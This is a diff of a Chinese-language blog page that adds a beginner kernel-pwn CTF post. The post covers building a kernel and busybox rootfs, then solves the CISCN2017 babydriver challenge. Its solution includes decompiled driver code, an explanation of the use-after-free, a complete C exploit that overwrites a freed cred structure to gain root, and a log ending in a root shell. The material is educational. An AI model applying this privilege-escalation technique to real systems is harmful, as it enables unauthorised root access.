@@ -96,14 +96,18 @@
 
 
 
-  <meta property="og:type" content="article">
+  <meta name="description" content="kernel入门自己的环境是16.04，出入kernel记录下，大佬勿喷。。">
+<meta name="keywords" content="ctf-pwn,kernel">
+<meta property="og:type" content="article">
 <meta property="og:title" content="kernel">
 <meta property="og:url" content="http://yoursite.com/2019/05/16/kernel/index.html">
 <meta property="og:site_name" content="peanuts&#39;blog">
+<meta property="og:description" content="kernel入门自己的环境是16.04，出入kernel记录下，大佬勿喷。。">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-05-16T14:44:49.604Z">
+<meta property="og:updated_time" content="2019-05-16T15:03:14.485Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="kernel">
+<meta name="twitter:description" content="kernel入门自己的环境是16.04，出入kernel记录下，大佬勿喷。。">
 
 
 
@@ -346,9 +350,13 @@
                 
               
 
-              <time title="Created: 2019-05-16 22:44:49" itemprop="dateCreated datePublished" datetime="2019-05-16T22:44:49+08:00">2019-05-16</time>
+              <time title="Created: 2019-05-16 22:44:49 / Modified: 23:03:14" itemprop="dateCreated datePublished" datetime="2019-05-16T22:44:49+08:00">2019-05-16</time>
             
 
+            
+              
+
+              
             
           </span>
 
@@ -381,7 +389,59 @@
       
 
       
-        
+        <h1 id="kernel入门"><a href="#kernel入门" class="headerlink" title="kernel入门"></a>kernel入门</h1><p>自己的环境是16.04，出入kernel记录下，大佬勿喷。。<br><a id="more"></a></p>
+<h2 id="环境编译"><a href="#环境编译" class="headerlink" title="环境编译"></a>环境编译</h2><p>下载kernel源代码：<a href="https://www.kernel.org/" target="_blank" rel="noopener">https://www.kernel.org/</a></p>
+<p>按照必要的依赖</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt-get install build-essential libncurses5-dev</span><br></pre></td></tr></table></figure>
+<h3 id="编译kernel源码"><a href="#编译kernel源码" class="headerlink" title="编译kernel源码"></a>编译kernel源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig #遵循sakura大佬博客</span><br><span class="line">#修改一些参数</span><br><span class="line">进入kernel hacking</span><br><span class="line">勾选以下项目</span><br><span class="line">Kernel debugging</span><br><span class="line">Compile-time checks and compiler options —&gt; Compile the kernel with debug info和Compile the kernel with frame pointers</span><br><span class="line">KGDB</span><br><span class="line">（大部分是开着的，似乎后面几个选项有没开的</span><br></pre></td></tr></table></figure>
+<p>接着就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make bzImage</span><br></pre></td></tr></table></figure>
+<p>编译的时间略有点长</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Setup is 17244 bytes (padded to 17408 bytes).</span><br><span class="line">System is 7666 kB</span><br><span class="line">CRC 5c77cbfe</span><br><span class="line">Kernel: arch/x86/boot/bzImage is ready  (#1</span><br></pre></td></tr></table></figure>
+<p>出现这个就表示已经编译成功了。<br>因为是小白入坑教程，所以我想应该解释下什么是bzimage</p>
+<blockquote>
+<p>vmlinux  编译出来的最原始的内核文件，未压缩。<br>zImage   是vmlinux经过gzip压缩后的文件。<br>bzImage bz表示“big zImage”</p>
+</blockquote>
+<p>这样解释后应该清楚的多了。那么我们现在就已经有一个内核文件了，接下来创建文件系统。</p>
+<h3 id="编译busybox"><a href="#编译busybox" class="headerlink" title="编译busybox"></a>编译busybox</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(from sakura大佬 blog</span><br><span class="line">wget https://busybox.net/downloads/busybox-1.27.2.tar.bz2</span><br><span class="line">tar -jxvf busybox-1.27.2.tar.bz2</span><br><span class="line">cd busybox-1.27.2</span><br><span class="line">make menuconfig # Busybox Settings -&gt; Build Options -&gt; Build Busybox as a static binary</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+<p>在文件夹下会有_install文件</p>
+<h4 id="建立文件系统"><a href="#建立文件系统" class="headerlink" title="建立文件系统"></a>建立文件系统</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd _install</span><br><span class="line">mkdir proc</span><br><span class="line">mkdir sys</span><br><span class="line">touch init</span><br><span class="line">chmod +x init</span><br></pre></td></tr></table></figure>
+<p>写init文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">mdev -s # We need this to find /dev/sda later</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br></pre></td></tr></table></figure>
+<p>打包文件系统</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;Generate rootfs.img&quot;</span><br><span class="line">cd busybox # fs folder</span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>mount指令 挂载某个分区到某个文件，这样就将分区与文件建立联系从而访问文件时就可以访问分区。</p>
+</blockquote>
+<p>以上参考：<br><a href="http://eternalsakura13.com/2018/04/13/qemu/" target="_blank" rel="noopener">Sakura大佬博客</a><br><a href="https://veritas501.space/2018/06/03/kernel环境配置/#more" target="_blank" rel="noopener">501大佬博客</a></p>
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>关于这样的环境编译是为了大概理解一下为什么做题的时候会给3个文件<code>.sh</code>,<code>bzimage</code>,<code>rootfs.cpio</code>分别是启动脚本，kernel镜像以及文件系统映像。下面来分析一下具体的kernel题，主要注重在调试。</p>
+<h2 id="CISCN2017-babydriver"><a href="#CISCN2017-babydriver" class="headerlink" title="CISCN2017 - babydriver"></a>CISCN2017 - babydriver</h2><p>讲到kernel pwn都会想到这个题目，那就分析一下这个题。题目文件有：</p>
+<ol>
+<li>boot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关</li>
+<li>bzImage: kernel binary</li>
+<li>rootfs.cpio: 文件系统映像</li>
+</ol>
+<p>从上面看是没什么问题的，一般问题都会处在rootfs.cpio中的驱动上，这题也不例外，首先解包文件系统映像。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir 随意什么名字下面用fs代替</span><br><span class="line">mv ../rootfs.cpio ./</span><br><span class="line">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure>
+<p>这样就成功解包了，在查看init文件，因为这里会加载一些驱动，而驱动是出问题最大的地方。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cat init</span><br><span class="line">#!/bin/sh</span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko#这里加载了驱动错意很可能是这里出了问题。</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&apos; &apos; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
+<h4 id="静态分析-ko文件"><a href="#静态分析-ko文件" class="headerlink" title="静态分析.ko文件"></a>静态分析.ko文件</h4><p>把文件拖到ida中查看。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall babyrelease(inode *inode, file *filp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; // rdx</span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(&quot;device release\n&quot;, filp, v2);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">#简单的free函数</span><br><span class="line">int __fastcall babyopen(inode *inode, file *filp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; // rdx</span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 37748928LL, 64LL);</span><br><span class="line">  babydev_struct.device_buf_len = 64LL;</span><br><span class="line">  printk(&quot;device open\n&quot;, 37748928LL, v2);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">#申请一块内存存放全局变量，并且定义device_bug_len为64.</span><br><span class="line">__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v3; // rdx</span><br><span class="line">  size_t v4; // rbx</span><br><span class="line">  __int64 v5; // rdx</span><br><span class="line">  __int64 result; // rax</span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  if ( command == 0x10001 )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(&quot;alloc done\n&quot;, 0x24000C0LL, v5);</span><br><span class="line">    result = 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB, v3, v3);</span><br><span class="line">    result = -22LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line">#定一个了一命令0x10001在这个命令下会释放babydev_struct.device_buf结构并且重新分配一个由用户定义其大小。</span><br><span class="line">void __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v4; // rdx</span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  if ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">      copy_from_user(babydev_struct.device_buf, buffer, v4);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">#从这里看是从buffer赋值到全局变量。（这里有个坑，有时候ida分析的时候会出很多错误。）</span><br><span class="line">void __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v4; // rdx</span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  if ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">      copy_to_user(buffer, babydev_struct.device_buf, v4);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">#与上面的操作正好相反。</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>主要的漏洞在条件竞争导致的一个UAF漏洞，因为babydev_struct 是全局的如果我们同时打开两个设备，然后释放第一个，其实第二个在编辑的时候就达到了一个uaf的作用。</p>
+</blockquote>
+<p>==重点：申请堆块的大小需要和cred结构体一样这样我们释放之后在fork一个进程其cred结构体会利用我们之前释放的==</p>
+<h6 id="什么是cred结构体"><a href="#什么是cred结构体" class="headerlink" title="什么是cred结构体"></a>什么是cred结构体</h6><p>是kernel中用来记录进程权限的，这个结构体中保存了该进程的权限等信息如（uid，gid）等，如果能修改这个结构体那么就修改了这个进程的权限。<br><a href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118" target="_blank" rel="noopener">源码</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">struct cred &#123;</span><br><span class="line">	atomic_t	usage;</span><br><span class="line">#ifdef CONFIG_DEBUG_CREDENTIALS</span><br><span class="line">	atomic_t	subscribers;	/* number of processes subscribed */</span><br><span class="line">	void		*put_addr;</span><br><span class="line">	unsigned	magic;</span><br><span class="line">#define CRED_MAGIC	0x43736564</span><br><span class="line">#define CRED_MAGIC_DEAD	0x44656144</span><br><span class="line">#endif</span><br><span class="line">	kuid_t		uid;		/* real UID of the task */</span><br><span class="line">	kgid_t		gid;		/* real GID of the task */</span><br><span class="line">	kuid_t		suid;		/* saved UID of the task */</span><br><span class="line">	kgid_t		sgid;		/* saved GID of the task */</span><br><span class="line">	kuid_t		euid;		/* effective UID of the task */</span><br><span class="line">	kgid_t		egid;		/* effective GID of the task */</span><br><span class="line">	kuid_t		fsuid;		/* UID for VFS ops */</span><br><span class="line">	kgid_t		fsgid;		/* GID for VFS ops */</span><br><span class="line">	unsigned	securebits;	/* SUID-less security management */</span><br><span class="line">	kernel_cap_t	cap_inheritable; /* caps our children can inherit */</span><br><span class="line">	kernel_cap_t	cap_permitted;	/* caps we&apos;re permitted */</span><br><span class="line">	kernel_cap_t	cap_effective;	/* caps we can actually use */</span><br><span class="line">	kernel_cap_t	cap_bset;	/* capability bounding set */</span><br><span class="line">	kernel_cap_t	cap_ambient;	/* Ambient capability set */</span><br><span class="line">#ifdef CONFIG_KEYS</span><br><span class="line">	unsigned char	jit_keyring;	/* default keyring to attach requested</span><br><span class="line">					 * keys to */</span><br><span class="line">	struct key __rcu *session_keyring; /* keyring inherited over fork */</span><br><span class="line">	struct key	*process_keyring; /* keyring private to this process */</span><br><span class="line">	struct key	*thread_keyring; /* keyring private to this thread */</span><br><span class="line">	struct key	*request_key_auth; /* assumed request_key authority */</span><br><span class="line">#endif</span><br><span class="line">#ifdef CONFIG_SECURITY</span><br><span class="line">	void		*security;	/* subjective LSM security */</span><br><span class="line">#endif</span><br><span class="line">	struct user_struct *user;	/* real user ID subscription */</span><br><span class="line">	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */</span><br><span class="line">	struct group_info *group_info;	/* supplementary groups for euid/fsgid */</span><br><span class="line">	struct rcu_head	rcu;		/* RCU deletion hook */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>那么接下来就是exp的编写，这个题目本身比较简单所以不需要动态调试，注意exp需要静态编译。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;stropts.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	// 打开两次设备</span><br><span class="line">	int fd1 = open(&quot;/dev/babydev&quot;, 2);</span><br><span class="line">	int fd2 = open(&quot;/dev/babydev&quot;, 2);</span><br><span class="line"></span><br><span class="line">	// 修改结构体的大小为cred结构体的大小</span><br><span class="line">	ioctl(fd1, 0x10001, 0x8a);</span><br><span class="line"></span><br><span class="line">	// 释放 fd1</span><br><span class="line">	close(fd1);</span><br><span class="line"></span><br><span class="line">	// 新fork一个进程会复用之前所用的空间来储存cred结构体。</span><br><span class="line">	int pid = fork();</span><br><span class="line">	if(pid &lt; 0)</span><br><span class="line">	&#123;</span><br><span class="line">		puts(&quot;[*] error!&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	else if(pid == 0)</span><br><span class="line">	&#123;</span><br><span class="line">		// uaf来更改结构体的值</span><br><span class="line">	   char buf[28] = &#123;0&#125;;</span><br><span class="line">		write(fd2, buf, 28);</span><br><span class="line"></span><br><span class="line">		if(getuid() == 0)</span><br><span class="line">		&#123;</span><br><span class="line">			puts(&quot;[+] good-you-get-it&quot;);</span><br><span class="line">			system(&quot;/bin/sh&quot;);</span><br><span class="line">			exit(0);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		wait(NULL);</span><br><span class="line">	&#125;</span><br><span class="line">	close(fd2);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后静态编译exp，再重新打包文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp exp fs/tmp</span><br><span class="line">find . | cpio -o --format=newc &gt; rootfs.cpio</span><br><span class="line">#替换掉之前的文件系统即可。</span><br></pre></td></tr></table></figure>
+<p>最后拿到root后的log</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/ $ cd home/ctf/</span><br><span class="line">~ $ ls</span><br><span class="line">exp    exp.c</span><br><span class="line">~ $ ./exp</span><br><span class="line">[   14.687284] device open</span><br><span class="line">[   14.691077] device open</span><br><span class="line">[   14.693858] alloc done</span><br><span class="line">[   14.697858] device release</span><br><span class="line">[+] good-you-get-it.</span><br><span class="line">/home/ctf # whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+<p>以上参考：<br><a href="http://m4x.fun/post/linux-kernel-pwn-abc-1/" target="_blank" rel="noopener">M4x大佬博客</a></p>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>总体来说只是简单的介绍了一下，ctf环境等kernel pwn，其中bzimage的得到以及概念，还有文件映像的得到及使用。接着是一题简单uaf的练习。（大佬勿喷</p>
+
       
     </div>
 
@@ -401,6 +461,14 @@
     
 
     <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf-pwn/" rel="tag"># ctf-pwn</a>
+          
+            <a href="/tags/kernel/" rel="tag"># kernel</a>
+          
+        </div>
       
 
       
@@ -463,8 +531,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <div class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -496,7 +573,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">1</span>
+                      
+                    
+                    <span class="site-state-item-count">2</span>
                     <span class="site-state-item-name">tags</span>
                   
                 </div>
@@ -523,6 +602,23 @@
         </div>
       </div>
 
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#kernel入门"><span class="nav-number">1.</span> <span class="nav-text">kernel入门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境编译"><span class="nav-number">1.1.</span> <span class="nav-text">环境编译</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#编译kernel源码"><span class="nav-number">1.1.1.</span> <span class="nav-text">编译kernel源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编译busybox"><span class="nav-number">1.1.2.</span> <span class="nav-text">编译busybox</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#建立文件系统"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">建立文件系统</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#总结"><span class="nav-number">1.1.2.1.1.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2017-babydriver"><span class="nav-number">1.2.</span> <span class="nav-text">CISCN2017 - babydriver</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#静态分析-ko文件"><span class="nav-number">1.2.0.1.</span> <span class="nav-text">静态分析.ko文件</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#什么是cred结构体"><span class="nav-number">1.2.0.1.0.1.</span> <span class="nav-text">什么是cred结构体</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
       
 
       
